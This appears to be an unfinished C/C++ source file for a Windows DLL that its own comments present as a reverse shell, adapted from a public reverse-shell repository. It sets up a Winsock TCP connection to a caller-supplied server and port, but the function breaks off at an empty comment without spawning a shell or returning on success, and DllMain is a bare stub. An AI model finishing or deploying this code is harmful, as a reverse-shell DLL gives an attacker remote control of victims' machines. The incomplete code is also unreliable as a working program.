// Based loosely on https://github.com/dev-frog/C-Reverse-Shell/blob/master/re.cpp
// and https://www.winsocketdotnetworkprogramming.com/winsock2programming/winsock2advancedcode1d.html

#include "pch.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#define BUFLEN 1024

int shell(char* server, unsigned int port) {
    WSADATA version;
    SOCKET socket;
    sockaddr_in addr;

    // Start the winsocket API
    WSAStartup(MAKEWORD(2, 2), &version);

    // Setup socket
    socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(server); // Original has sin_addr.s_addr
    addr.sin_port = htons(port);

    // Attempt to connect
    if(WSAConnect(socket, (SOCKADDR*)&addr, sizeof addr) == SOCKET_ERROR) {
        closesocket(socket);
        WSACleanup();
        return -1;
    }

    // 

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}